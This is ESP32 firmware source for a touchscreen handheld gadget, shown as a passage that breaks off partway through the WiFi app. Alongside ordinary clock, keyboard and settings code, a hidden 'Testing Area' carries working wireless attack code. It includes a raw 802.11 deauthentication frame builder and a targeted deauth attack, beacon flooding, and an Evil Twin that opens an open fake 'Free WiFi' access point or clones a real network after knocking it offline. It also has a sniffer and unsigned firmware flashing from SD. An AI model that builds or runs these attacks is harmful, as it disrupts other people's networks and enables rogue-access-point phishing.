#include "esp_wifi.h"
#include <WiFi.h>
#include <TFT_eSPI.h>
#include <NTPClient.h>
#include <XPT2046_Touchscreen.h>
#include "FS.h"
#include "SD.h"
#include <vector>
#include <math.h>
#include "imagen.h"
#include "bs.h"
#include "esp_partition.h"
#include "esp_ota_ops.h"
#include "deauth.h"
#include "types.h"
#include "definitions.h"
#include <HTTPClient.h>

#define SD_CS 5

TFT_eSPI tft = TFT_eSPI();
WiFiUDP ntpUDP;
NTPClient timeClient(ntpUDP, "time.google.com", 7 * 3600);

#define XPT2046_IRQ 36
#define XPT2046_MOSI 32
#define XPT2046_MISO 39
#define XPT2046_CLK 25
#define XPT2046_CS 33

#define MAX_TOUCH_X 3700
#define MIN_TOUCH_X 300
#define MAX_TOUCH_Y 3800
#define MIN_TOUCH_Y 200
SPIClass touchscreenSPI = SPIClass(VSPI);
XPT2046_Touchscreen touchscreen(XPT2046_CS, XPT2046_IRQ);
TFT_eSprite screen = TFT_eSprite(&tft);

#define SCREEN_WIDTH 240
#define SCREEN_HEIGHT 320
#define SCREEN_ROTATION 0

// Light(s)
#define LIGR 4
#define LIGG 16
#define LIGB 17
#define CH_R 0
#define CH_G 1
#define CH_B 2
#define BLIG 21
#define CH_D 3

bool antiML = false, timeUpdate = false, 
timeBegin = false, apRun = false, swRun = false, swPause = false, swF = false;
int waitUpdate = 0, swStart = 0, swFast = 0, swSlow = 0, swTime = 0, swPT = 0, bl = 128,
leC[] = {0, 0, 0};
float satFactor = 2.4;
String apSSID = "", apPass = "";

void ledColor(int r, int g, int b) {
  ledcWrite(CH_R, 256 - r);
  ledcWrite(CH_G, 256 - map(g, 0, 255, 0, 128));
  ledcWrite(CH_B, 256 - map(b, 0, 255, 0, 128));
}

void backlight(int value) {
  ledcWrite(CH_D, value);
}

struct gtime {
  String hm;
  String d;
};

int min(int a, int b) {
  if (a > b) return b;
  else return a;
}

gtime gTime(bool onlyHour = true, bool isSec = false) {
  gtime idk = {"00:00", "Device Time"};
  unsigned long hours = 0;
  unsigned long minutes = 0;
  unsigned long seconds = 0;
  if (WiFi.status() == WL_CONNECTED) {
    if (!timeUpdate) {
      if (!timeBegin) timeClient.begin();
      timeClient.update();
      timeUpdate = true;
      waitUpdate = millis();
    } else {
      unsigned long epo = timeClient.getEpochTime();
      struct tm timeinfo;
      gmtime_r((time_t*)&epo, &timeinfo);
      hours = timeinfo.tm_hour;
      minutes = timeinfo.tm_min;
      seconds = timeinfo.tm_sec;
      if (!onlyHour) {
        char dsStr[15];
        if (timeinfo.tm_year + 1900 > 2000)
        snprintf(dsStr, sizeof(dsStr), "%02d/%02d/%04d", timeinfo.tm_mday, timeinfo.tm_mon + 1, timeinfo.tm_year + 1900);
        else {snprintf(dsStr, sizeof(dsStr), "Broken Network"); timeClient.update();}
        idk.d = String(dsStr);
      }
    }
  } else {
    unsigned long currentMillis = millis();
    seconds = currentMillis / 1000;
    minutes = seconds / 60;
    hours = minutes / 60;
    minutes = minutes % 60;
    hours = hours % 24;
  }
  char hmStr[11];
  if (isSec) snprintf(hmStr, sizeof(hmStr), "%02d:%02d:%02d", hours, minutes, seconds);
  else snprintf(hmStr, sizeof(hmStr), "%02d:%02d", hours, minutes);
  idk.hm = String(hmStr);
  return idk;
}

void devSleep(bool turnDisplayOff = false) {
  if (turnDisplayOff) {
    for (int i = 128; i >= 0; i--) {
      backlight(i);
      delay(2);
    }
    tft.fillScreen(TFT_BLACK);
    while (digitalRead(0) == HIGH) delay(500);
    for (int i = 0; i <= bl; i++) {
      backlight(i);
      delay(2);
    }
    return;
  } else {
    bool dpoff = false;
    int st = millis(), hld = true;
    while (!(digitalRead(0) == LOW || (touchscreen.touched() && !hld))) {
      if (!touchscreen.touched()) hld = false;
      screen.fillScreen(TFT_BLACK);
      screen.drawCentreString(gTime().hm, 120, 80, 6);
      screen.drawCentreString(gTime(false).d, 120, 120, 2.8);
      if (WiFi.status() == WL_CONNECTED)
      screen.drawCentreString("WiFi Connected, Signal " + String(WiFi.RSSI()) + "dBm", 120, 280, 1);
      else if (apRun) screen.drawCentreString("Access Point Created, " + String(WiFi.softAPgetStationNum()) + " device(s)", 120, 280, 1);
      else screen.drawCentreString("No Connection", 120, 280, 1);
      screen.pushSprite(0, 0);
      if (millis() - st > 10000) {
        for (int i = bl; i >= 0; i--) {
          backlight(i);
          delay(2);
        }
        tft.fillScreen(TFT_BLACK);
        ledColor(0, 0, 8);
        while (digitalRead(0) == HIGH) delay(500);
        ledColor(0, 0, 0);
        int i = 0, dst = millis();
        float si = 0;
        while (i <= bl && millis() - dst < 1000) {
          screen.fillScreen(TFT_BLACK);
          screen.drawCentreString(gTime().hm, 120, map(i, 0, bl, -60, 80), 6);
          screen.drawCentreString(gTime(false).d, 120, map(i, 0, bl, -60, 120), 2.8);
          int tmp = map(i, 0, bl, 360, 280);
          if (WiFi.status() == WL_CONNECTED)
          screen.drawCentreString("WiFi Connected, Signal " + String(WiFi.RSSI()) + "dBm", 120, tmp, 1);
          else if (apRun) screen.drawCentreString("Access Point Created, " + String(WiFi.softAPgetStationNum()) + " device(s)", 120, tmp, 1);
          else screen.drawCentreString("No Connection", 120, tmp, 1);
          screen.pushSprite(0, 0);
          backlight(i);
          si += (140 - i) / 10;
          i = si;
          i = constrain(i, 0, bl + 1);
          //delay(1);
        }
        i = constrain(i, 0, bl);
        st = millis();
      }
      backlight(bl);
      delay(100);
    }
  }
}

int clickButton(int px, int py, const int b[][4], int many) {
  int btact = -1;
  for (int idx = 0; idx < many; idx++) {
    if (px >= b[idx][0] && px <= b[idx][0] + b[idx][2] &&
  py >= b[idx][1] && py <= b[idx][1] + b[idx][3]) {
      btact = idx;
    }
  } return btact;
}

String keyboard(String title = "Input:", String initText = "") {

  const int SCREEN_W = SCREEN_WIDTH;
  const int SCREEN_H = SCREEN_HEIGHT;

  int row1Y = 155, row2Y = 195, row3Y = 235, row4Y = 275;
  int keyH = 40;

  const char* alphaRow1 = "qwertyuiop";
  const char* alphaRow2 = "asdfghjkl"; 
  const char* alphaRow3 = "zxcvbnm";   
  const char* capsRow1 = "QWERTYUIOP"; 
  const char* capsRow2 = "ASDFGHJKL";  
  const char* capsRow3 = "ZXCVBNM";    

  const char* symRow1   = "1234567890";   
  const char* symRow2   = "!@#$%^&*(";    
  const char* symRow3   = ")-_=+[]";      
  const char* subsymRow2   = "{};:'\",.<";
  const char* subsymRow3   = "?/\\|`~>";  

  int funcKeyW = SCREEN_W / 5;

  int row1KeyW = SCREEN_W / 10; 
  int row2KeyW = SCREEN_W / 9;  
  int row3KeyW = SCREEN_W / 7;  

  bool isSymbol = false;
  String input = initText;
  bool typing = true, holding = true, shift = false;

  screen.fillScreen(TFT_BLACK);
  screen.setTextColor(TFT_WHITE, TFT_BLACK);
  screen.setTextDatum(TL_DATUM);

  while (typing) {
    screen.fillScreen(TFT_BLACK);
    screen.drawLine(0, 30, SCREEN_WIDTH, 30, TFT_WHITE);
    screen.drawString(title, 2, 6, 2.4);
    screen.setCursor(0, 40);
    screen.print(input + "_");

    const char* row1 = isSymbol ? symRow1 : (shift ? capsRow1 : alphaRow1);
    bool izCap = !isSymbol && shift;
    for (int i = 0; i < strlen(row1); i++) {
      int x = i * row1KeyW;
      screen.drawRect(x, row1Y, row1KeyW, keyH, TFT_WHITE);
      screen.drawCentreString(String(row1[i]), x + row1KeyW/2, row1Y + 10, 2.4);
    }
    const char* row2 = isSymbol ? (shift ? subsymRow2 : symRow2) : (shift ? capsRow2 : alphaRow2);
    for (int i = 0; i < strlen(row2); i++) {
      int x = i * row2KeyW;
      screen.drawRect(x, row2Y, row2KeyW, keyH, TFT_WHITE);
      screen.drawCentreString(String(row2[i]), x + row2KeyW/2, row2Y + 10, 2.4);
    }
    const char* row3 = isSymbol ? (shift ? subsymRow3 : symRow3) : (shift ? capsRow3 : alphaRow3);
    for (int i = 0; i < strlen(row3); i++) {
      int x = i * row3KeyW;
      screen.drawRect(x, row3Y, row3KeyW, keyH, TFT_WHITE);
      screen.drawCentreString(String(row3[i]), x + row3KeyW/2, row3Y + 10, 2.4);
    }
    String funcLabels[5] = {"@#", "Shf", "Spc", "Bkp", "Ent"};
    for (int i = 0; i < 5; i++) {
      int x = i * funcKeyW;
      screen.drawRect(x, row4Y, funcKeyW, keyH, TFT_WHITE);
      screen.drawCentreString(funcLabels[i], x + funcKeyW/2, row4Y + 10, 2.4);
    }

    screen.pushSprite(0, 0);

    if (touchscreen.touched() && !holding) {
      TS_Point p = touchscreen.getPoint();
      int tx = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 0, SCREEN_W);
      int ty = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 0, SCREEN_H);
      holding = true;

      if (ty >= row1Y && ty < row1Y + keyH) {
        int col = tx / row1KeyW;
        if (col >= 0 && col < (int)strlen(row1)) {
          input += row1[col];
        }
      }
      else if (ty >= row2Y && ty < row2Y + keyH) {
        int col = tx / row2KeyW;
        if (col >= 0 && col < (int)strlen(row2)) {
          input += row2[col];
        }
      }
      else if (ty >= row3Y && ty < row3Y + keyH) {
        int col = tx / row3KeyW;
        if (col >= 0 && col < (int)strlen(row3)) {
          input += row3[col];
        }
      }
      else if (ty >= row4Y && ty < row4Y + keyH) {
        int col = tx / funcKeyW;
        switch (col) {
          case 0:
            isSymbol = !isSymbol;
            break;
          case 1:
            shift = !shift;
            break;
          case 2:
            input += " ";
            break;
          case 3:
            if (input.length() > 0) input.remove(input.length() - 1);
            break;
          case 4:
            if (shift) input += "\n";
            else {
              typing = false;
              break;
            }
        }
      }
    } else if (!touchscreen.touched()) {
      holding = false;
    }
    delay(10);
  }
  return input;
}

void status_bar(String title = "") {
  screen.drawLine(0, 20, SCREEN_WIDTH, 20, TFT_WHITE);
  screen.setTextColor(TFT_WHITE);

  screen.drawString(gTime().hm, 2, 2, 2.4);
  screen.drawCentreString(title, 120, 2, 2.4);
  wifi_mode_t wmode = WiFi.getMode();
  if (wmode == WIFI_MODE_AP) {
    screen.drawBitmap(180, 2, mhotspot, 16, 16, apRun ? TFT_BLUE : TFT_WHITE, TFT_BLACK);
  } else if (WiFi.status() == WL_CONNECTED) {
    int strength = map(WiFi.RSSI(), -180, -40, 0, 100);
    strength = constrain(strength, 0, 100);
    screen.drawBitmap(180, 2, stwf[strength / 25], 16, 16, TFT_WHITE, TFT_BLACK);
  } else {screen.drawBitmap(180, 2, stwf[0], 16, 16, TFT_RED, TFT_BLACK);};
  screen.drawBitmap(200, 2, mbluetooth, 16, 16, TFT_WHITE, TFT_BLACK);
  screen.drawCircle(230, 10, 6, TFT_WHITE);
}

int navigation(bool is_home = false, bool is_option = false) {
  screen.drawLine(0, 280, SCREEN_WIDTH, 280, TFT_WHITE);
  screen.drawLine(80, 280, 80, 320, TFT_WHITE);
  screen.drawLine(160, 280, 160, 320, TFT_WHITE);
  if (is_home) {
    screen.drawBitmap(24, 285, settings, 30, 30, TFT_WHITE, TFT_BLACK);
    screen.drawBitmap(104, 285, power, 30, 30, TFT_WHITE, TFT_BLACK);
    screen.drawBitmap(184, 285, lock_icon, 30, 30, TFT_WHITE, TFT_BLACK);
  } else {
    screen.drawBitmap(24, 285, return_ico, 30, 30, TFT_WHITE, TFT_BLACK);
    screen.drawBitmap(104, 285, home, 30, 30, TFT_WHITE, TFT_BLACK);
    if (is_option) screen.drawBitmap(184, 285, option, 30, 30, TFT_WHITE, TFT_BLACK);
    else screen.drawBitmap(184, 285, no_option, 30, 30, TFT_WHITE, TFT_BLACK);
  }
  if (touchscreen.touched() && !antiML) {
    TS_Point p = touchscreen.getPoint();
    int px = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 1, SCREEN_WIDTH);
    int py = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);
    if (px >= 0 && px <= 80 && py >= 280 && py <= 320) {
      antiML = true;
      return 0;
    } else if (px >= 80 && px <= 160 && py >= 280 && py <= 320) {
      antiML = true;
      return 1;
    } else if (px >= 160 && px <= 240 && py >= 280 && py <= 320) {
      antiML = true;
      return 2;
    }
  } if (!touchscreen.touched())
  antiML = false;
  return -1;
}

void setting() {
  int lsld = map(bl, 1, 255, 0, 200);
  while (true) {
    screen.fillScreen(TFT_BLACK);
    screen.setTextColor(TFT_WHITE, TFT_BLACK);
    screen.drawString("Backlight: " + String(bl), 10, 120, 2);
    screen.drawRect(10, 140, 220, 20, TFT_WHITE);
    screen.fillRect(10 + lsld, 140, 20, 20, TFT_WHITE);
    if (touchscreen.touched()) {
      TS_Point p = touchscreen.getPoint();
      int px = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 1, SCREEN_WIDTH);
      int py = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);
      if (140 < py && py < 160) lsld = px - 10;
    }
    lsld = constrain(lsld, 0, 200);
    bl = map(lsld, 0, 200, 1, 255);
    backlight(bl);
    status_bar("Settings");
    int navi = navigation();
    if (navi == 0 || navi == 1) {screen.setTextColor(TFT_WHITE, TFT_BLACK); return;}
    if (navi == 2) {bl = 128; lsld = map(bl, 1, 255, 0, 200);}
    screen.pushSprite(0, 0);
    delay(10);
  }
}

int mainMenu() { // Main Menu (or launcher idk)
  const int buttons[6][4] = {
    {10, 60, 64, 64},
    {88, 60, 64, 64},
    {166, 60, 64, 64},
    {10, 160, 64, 64},
    {88, 160, 64, 64},
    {166, 160, 64, 64}
  };
  bool choosing = true, hld = true;
  int slt = millis();
  while (choosing) {
    // ----Touchscreen----
    if (touchscreen.touched() && !hld) {
      hld = true;
      TS_Point p = touchscreen.getPoint();
      int px = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 1, SCREEN_WIDTH);
      int py = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);
      int bt = clickButton(px, py, buttons, 6);
      if (bt == 0) {
        choosing = false;
        return 0;
      } else if (bt == 1) {
        choosing = false;
        return 1;
      } else if (bt == 2) {
        choosing = false;
        return 2;
      } else if (bt == 3) {
        choosing = false;
        return 3;
      } else if (bt == 4) {
        choosing = false;
        return 4;
      } else if (bt == 5) {
        choosing = false;
        return 5;
      }
    } if (!touchscreen.touched() && hld) hld = false;
    // ----Graphics----
    screen.fillScreen(TFT_BLACK);
    status_bar("Main Menu");
    screen.drawBitmap(10, 60, big_wifi[4], 64, 64, TFT_WHITE, TFT_BLACK);
    screen.drawBitmap(88, 60, hotspot, 64, 64, TFT_WHITE, TFT_BLACK);
    screen.drawBitmap(166, 60, clock_icon, 64, 64, TFT_WHITE, TFT_BLACK);
    screen.drawBitmap(10, 160, games, 64, 64, TFT_WHITE, TFT_BLACK);
    screen.drawBitmap(88, 160, folder, 64, 64, TFT_WHITE, TFT_BLACK);
    screen.drawBitmap(166, 160, more, 64, 64, TFT_WHITE, TFT_BLACK);
    screen.drawCentreString("WiFi", 42, 130, 2.4);
    screen.drawCentreString("Hotspot", 120, 130, 2.4);
    screen.drawCentreString("Clock", 198, 130, 2.4);
    screen.drawCentreString("Games", 42, 230, 2.4);
    screen.drawCentreString("Files", 120, 230, 2.4);
    screen.drawCentreString("More", 198, 230, 2.4);
    int navi = navigation(true);
    if (navi == 1) {
      screen.fillScreen(TFT_BLACK);
      int cx = SCREEN_WIDTH / 2;
      int cy = SCREEN_HEIGHT / 2;
      screen.drawBitmap(cx - 64, cy - 64, noidLogo, 128, 128, TFT_WHITE, TFT_BLACK);
      screen.drawCentreString("Shutting down...", cx, cy + 80, 4);
      screen.pushSprite(0, 0);
      delay(1000);
      for (int i = bl; i > 0; i--) {
        backlight(i);
        delay(10);
      }
      esp_deep_sleep_start();
    }
    if (navi == 2) devSleep(false);
    if (navi == 0) {setting(); slt = millis();}
    screen.pushSprite(0, 0);
    if (millis() - slt > 10000) {
      devSleep(false);
      slt = millis();
      hld = true;
    }
    delay(100);
  }
  return -1;
}

bool button(String text, int x, int y, int l, int color = TFT_WHITE, int size = 2.8) {
  const int fh = screen.fontHeight(size);
  screen.setTextColor(TFT_BLACK, color);
  screen.fillCircle(x, y + fh / 2 + 2, fh / 2 + 2, color);
  screen.fillCircle(x + l, y + fh / 2 + 2, fh / 2 + 2, color);
  screen.fillRect(x, y, l, fh + 6, color);
  screen.drawCentreString(text, x + l / 2, y + 2, size);
  if (touchscreen.touched() && !antiML) {
    TS_Point p = touchscreen.getPoint();
    int px = map(p.x, MIN_TOUCH_X, MAX_TOUCH_X, 1, SCREEN_WIDTH);
    int py = map(p.y, MIN_TOUCH_Y, MAX_TOUCH_Y, 1, SCREEN_HEIGHT);
    if (x < px && px < x + l && y < py && py < y + fh + 6) {
      antiML = true;
      return true;
    }
  } if (!touchscreen.touched()) antiML = false;
  return false;
}

String terminal[40] = {""};
int terminalLine = 0;

#define MAX_LINES 40
#define MAX_WIDTH 40

void terminalPrint(String input) {
  if (input == "") return;
  String lines[MAX_LINES];
  int lineCount = 0;
  
  int start = 0;
  while (start < input.length()) {
    int end = min(start + MAX_WIDTH, input.length());

    int newlinePos = input.indexOf('\n', start);
    if (newlinePos != -1 && newlinePos < end) {
      end = newlinePos;
    }

    lines[lineCount++] = input.substring(start, end);

    if (input.charAt(end) == '\n') {
      start = end + 1;
    } else {
      start = end;
    }
  }

  for (int i = 0; i < lineCount; i++) {
    if (terminalLine < MAX_LINES) {
      terminal[terminalLine++] = lines[i];
    } else {
      for (int j = 0; j < MAX_LINES - 1; j++) {
        terminal[j] = terminal[j + 1];
      }
      terminal[MAX_LINES - 1] = lines[i];
    }
  }

  tft.setCursor(0, 0);
  for (int i = max(0, terminalLine - MAX_LINES); i < terminalLine; i++) {
    tft.fillRect(0, i * 8, 240, 8, TFT_BLACK);
    tft.println(terminal[i]);
  }
}

void clearTerminal() {
  for (int i = 0; i < 40; i++) {
    terminal[i] = "";
  }
  terminalLine = 0;
  tft.fillScreen(TFT_BLACK);
}

void sendDeauth(uint8_t *bssid, uint8_t reason) {
  uint8_t deauthPacket[26] = {
      0xc0, 0x00,
      0x00, 0x00,
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], 
      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], 
      0x00, 0x00,  
      reason, 0x00  
    };

  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
}


void loadFirmwareFromSD(const char* path) {
  if (!SD.begin(SD_CS)) {
    Serial.println("SD Card Disconnected!");
    return;
  }
  File firmware = SD.open(path);
  if (!firmware) {
      Serial.println("Can't find firmware on SD card!");
      return;
  }

  esp_ota_handle_t ota_handle;
  const esp_partition_t* update_partition = esp_ota_get_next_update_partition(NULL);

  if (esp_ota_begin(update_partition, OTA_SIZE_UNKNOWN, &ota_handle) != ESP_OK) {
      Serial.println("OTA begin Error");
      return;
  }

  uint8_t buf[1024];
  while (firmware.available()) {
      size_t len = firmware.read(buf, sizeof(buf));
      esp_ota_write(ota_handle, buf, len);
  }

  esp_ota_end(ota_handle);
  esp_ota_set_boot_partition(update_partition);

  Serial.println("Firmware loaded, restarting...");
  ESP.restart();
}

typedef struct {
  unsigned frame_ctrl:16;
  unsigned duration_id:16;
  uint8_t addr1[6];
  uint8_t addr2[6];
  uint8_t addr3[6];
  unsigned sequence_ctrl:16;
  uint8_t addr4[6];
} wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0];
} wifi_ieee80211_packet_t;

typedef struct {
  uint8_t id;
  uint8_t len;
  uint8_t data[0];
} wifi_ieee80211_info_element_t;

struct newold {
  int ov;
  int nv;
};

newold sniffManage =  {0, 0};
newold sniffControl = {0, 0};
newold sniffData =    {0, 0};
newold sniffMisc =    {0, 0};
newold sniffUnknown = {0, 0};
newold sniffProbe =   {0, 0};
newold sniffBeacon =  {0, 0};
newold sniffDeaunth = {0, 0};

String history[5] = {""};
String shistory[5] = {""};
int historyLine = 0;
int shistoryLine = 0;

void lookAround(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
  wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
  uint16_t frame_ctrl = hdr->frame_ctrl;

  char buffer[128];
  char ssid[33] = ""; // SSID có thể dài tối đa 32 ký tự + 1 ký tự null

  if ((frame_ctrl & 0x00F0) == 0x0080) {
    // Beacon frame
    sniffBeacon.nv++;
    uint8_t *payload = ipkt->payload + 12; // Bỏ qua phần fixed parameters (12 bytes)
    int payload_len = pkt->rx_ctrl.sig_len - sizeof(wifi_ieee80211_mac_hdr_t) - 12;
    while (payload_len > 2) {
      wifi_ieee80211_info_element_t *ie = (wifi_ieee80211_info_element_t *)payload;
      if (ie->id == 0) { // SSID element
        int len = min(ie->len, 32);
        memcpy(ssid, ie->data, len);
        ssid[len] = '\0';
        break;
      }
      payload += ie->len + 2;
      payload_len -= ie->len + 2;
    }
    snprintf(buffer, sizeof(buffer), "B%d:%02X:%02X:%02X:%02X:%02X:%02X->%s",
             pkt->rx_ctrl.rssi, hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
             hdr->addr2[3], hdr->addr2[4], hdr->addr2[5], ssid);
  } else if ((frame_ctrl & 0x00F0) == 0x0040) {
    // Probe request frame
    sniffProbe.nv++;
    uint8_t *payload = ipkt->payload;
    int payload_len = pkt->rx_ctrl.sig_len - sizeof(wifi_ieee80211_mac_hdr_t);
    while (payload_len > 2) {
      wifi_ieee80211_info_element_t *ie = (wifi_ieee80211_info_element_t *)payload;
      if (ie->id == 0) { // SSID element
        int len = min(ie->len, 32);
        memcpy(ssid, ie->data, len);
        ssid[len] = '\0';
        break;
      }
      payload += ie->len + 2;
      payload_len -= ie->len + 2;
    }
    snprintf(buffer, sizeof(buffer), "P%d:%02X:%02X:%02X:%02X:%02X:%02X->%s",
             pkt->rx_ctrl.rssi, hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
             hdr->addr2[3], hdr->addr2[4], hdr->addr2[5], ssid);
  } else if ((frame_ctrl & 0x00F0) == 0x00C0) {
    // Deauthentication frame
    sniffDeaunth.nv++;
    snprintf(buffer, sizeof(buffer), "D%d:%02X:%02X:%02X:%02X:%02X:%02X",
             pkt->rx_ctrl.rssi, hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
             hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
  }

  // Add to shistory
  if (shistoryLine < 5) {
    shistory[shistoryLine++] = buffer;
  } else {
    for (int i = 0; i < 4; i++) {
      shistory[i] = shistory[i + 1];
    }
    shistory[4] = buffer;
  }

  // Add RSSI, type and Source Mac to history
  snprintf(buffer, sizeof(buffer), "R:%d, T:%d, MAC: %02X:%02X:%02X:%02X:%02X:%02X",
           pkt->rx_ctrl.rssi, type, hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
           hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
  if (historyLine < 5) {
    history[historyLine++] = buffer;
  } else {
    for (int i = 0; i < 4; i++) {
      history[i] = history[i + 1];
    }
    history[4] = buffer;
  }

  switch (type) {
    case WIFI_PKT_MGMT:
      sniffManage.nv++;
      break;
    case WIFI_PKT_CTRL:
      sniffControl.nv++;
      break;
    case WIFI_PKT_DATA:
      sniffData.nv++;
      break;
    case WIFI_PKT_MISC:
      sniffMisc.nv++;
      break;
    default:
      sniffUnknown.nv++;
      break;
  }
}

void appWifi() {
  bool in_use = true, apRun = false;
  int wl_near = 0, sel = -1,
  scrOfst = 0, dy = 0, lastY = 0,
  ffr = 120;
  bool isScrolling = false;
  WiFi.mode(WIFI_STA);

  while (in_use) {
    screen.fillScreen(TFT_BLACK);
    status_bar("WiFi");
    int navi = navigation(false, true);
    if (navi == 0 || navi == 1) {
      in_use = false;
      }
    if (digitalRead(0) == LOW && navi == 2) {
        bool advan = true;
        tft.fillScreen(TFT_BLACK);
        tft.setTextColor(TFT_RED, TFT_BLACK);
        tft.drawCentreString("!!!Warning!!!", 120, 120, 4);
        tft.drawCentreString("Testing Area!", 120, 150, 2);
        tft.drawCentreString("Enter as your risk!", 120, 170, 2);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        for (int st = 3; st > 0; st--) {
          tft.drawCentreString("OK, I'm know what to do (" + String(st) + ")", 120, 200, 2);
          delay(1000);
        }
        tft.fillRect(0, 190, 240, 40, TFT_BLACK);
        tft.drawCentreString("OK, I'm know what to do", 120, 200, 2);
        tft.setCursor(0, 0);
        tft.setTextColor(TFT_BLUE);
        tft.println("[BOOT] to continue");
        tft.setTextColor(TFT_ORANGE);
        tft.println("[TOUCH] to exit");
        while (!(touchscreen.touched() || digitalRead(0) == LOW)) {
          if (touchscreen.touched()) return;
        }
        tft.setTextColor(TFT_WHITE);
        tft.fillScreen(TFT_BLACK);
        tft.setCursor(0, 0);
        terminalPrint("Testing features:");
        terminalPrint("1. Deauth Attack");
        terminalPrint("2. Beacon Flooding");
        terminalPrint("3. Evil Twin");
        terminalPrint("4. Knockdown Attack"); //basically deauth but it will send deauth to all APs
        terminalPrint("5. Load Firmware");
        terminalPrint("6. Sniffer"); // still hopeless
        terminalPrint("Warning: there \"features\" is under developemt and can be caught, so use it for educational purpose only!");
        terminalPrint("Select feature to use ([BOOT] to change, hold to select, default value is 1):");
        int sel = 0, tmr = millis();
        bool hld = false, choosing = true;
        while (choosing) {
          delay(100);
          if (digitalRead(0) == LOW && !hld) {
            hld = true;
            tmr = millis();
          } if (digitalRead(0) == HIGH && hld) {
            hld = false;
            if (millis() - tmr < 1000) {sel = (sel + 1) % 6; terminalPrint(">" + String(sel + 1));}
            else choosing = false;
          }
        }
        switch (sel) {
          case 0: {
            terminalPrint("Deauth Attack Selected!");
            terminalPrint("Scanning for APs...");
            int numAP = WiFi.scanNetworks();
            if (numAP <= 0) {
              terminalPrint("No APs found! Please restart device and scan again.");
              delay(3000);
              return;
            }
            terminalPrint("     ");
            terminalPrint("APs found:");
            terminalPrint("ID | RSSI | SSID");
            for (int i = 0; i < numAP; i++) {
              terminalPrint(String(i) + "   " + String(WiFi.RSSI(i)) + "    " + WiFi.SSID(i));
            }
            terminalPrint("     ");
            terminalPrint("Select AP to attack:");
            terminalPrint("Selected AP: " + WiFi.SSID(0));
            int apIndex = 0, touchStart = 0;
            bool selectingAP = true, holding = false;
            while (selectingAP) {
              if (digitalRead(0) == LOW && !holding) {
                holding = true;
                touchStart = millis();
              } if (digitalRead(0) == HIGH && holding) {
                holding = false;
                if (millis() - touchStart < 1000) {
                  apIndex = (apIndex + 1) % numAP;
                  terminalPrint("Selected AP: " + WiFi.SSID(apIndex));
                } else {
                  selectingAP = false;
                }
              }
            }
            terminalPrint("Select reason code (1-7, default is 2):");
            int reason = 2; // default
            touchStart = 0;
            holding = false;
            bool selectingReason = true;
            while (selectingReason) {
              if (digitalRead(0) == LOW && !holding) {
                holding = true;
                touchStart = millis();
              } 
              if (digitalRead(0) == HIGH && holding) {
                holding = false;
                if (millis() - touchStart < 1000) {
                  reason = (reason + 1) % 7;
                  terminalPrint("Selected reason code: " + String(reason));
                } else {
                  selectingReason = false;
                }
              }
            }
            terminalPrint("Starting deauth attack on AP: " + WiFi.SSID(apIndex));
            start_deauth(apIndex, 0, reason);
          
            terminalPrint("Deauth started, hold [TOUCH] for 5s to abort");
            while (true) {
              delay(50);
              if (mayOutput) {
                terminalPrint(brige);
                mayOutput = false;
              }
              if (touchscreen.touched()) {
                unsigned long abortStart = millis();
                while (touchscreen.touched()) {
                  if (millis() - abortStart > 5000) {
                    terminalPrint("Abort signal detected. Restarting device...");
                    delay(1000);
                    ESP.restart();
                  }
                  delay(50);
                }
              }
            }
            break;
          }
          
          case 1: {
            terminalPrint("Beacon Flooding Selected!");
            terminalPrint("Running some code from random github project that I found"); //I'm too lazy to write this
            frun();
            while (true) terminalPrint(lrun());
            break;
          }
          case 2: {
            terminalPrint("Evil Twin Selected!");
            if (WiFi.status() != WL_CONNECTED) {
              terminalPrint("Not connected to WiFi, creating fake \"Free WiFi\" AP, hold [boot] if you wanna change...");
              delay(3000);
              String apName = "Free WiFi";
              if (digitalRead(0) == LOW) {
                terminalPrint("Enter AP name:");
                apName = keyboard("AP Name:");
                tft.fillScreen(TFT_BLACK);
                if (apName == "") apName = "Free WiFi";
                if (apName == "$DEAUNTH") {
                  terminalPrint("Flag detected, preparing deaunth...");
                  int num = WiFi.scanNetworks();
                  if (num < 0) {
                    terminalPrint("Failed to scan networks, restarting...");
                    delay(1000);
                    esp_restart();
                  }
                  terminalPrint("     ");
                  terminalPrint("APs found:");
                  terminalPrint("ID | RSSI | SSID");
                  for (int i = 0; i < num; i++) {
                    terminalPrint(String(i) + "   " + String(WiFi.RSSI(i)) + "    " + WiFi.SSID(i));
                  }
                  terminalPrint("     ");
                  terminalPrint("Select AP to deauth:");
                  int sel = 0, touchStart = 0;
                  bool selectingAP = true, holding = false;
                  while (selectingAP) {
                    if (digitalRead(0) == LOW && !holding) {
                      holding = true;
                      touchStart = millis();
                    } if (digitalRead(0) == HIGH && holding) {
                      holding = false;
                      if (millis() - touchStart < 1000) {
                        sel = (sel + 1) % num;
                        terminalPrint("Selected AP: " + WiFi.SSID(sel));
                      } else {
                        selectingAP = false;
                      }
                    }
                  }
                  terminalPrint("Deaunth started on AP: " + WiFi.SSID(sel) + ", Closing Evil Twin...");
                  start_deauth(sel, 0, 2);
                  delay(1000);
                  apName = WiFi.SSID(sel);
                }
              }
              WiFi.softAP(apName, ""); // No password
              //WiFi.disconnect(true, true);
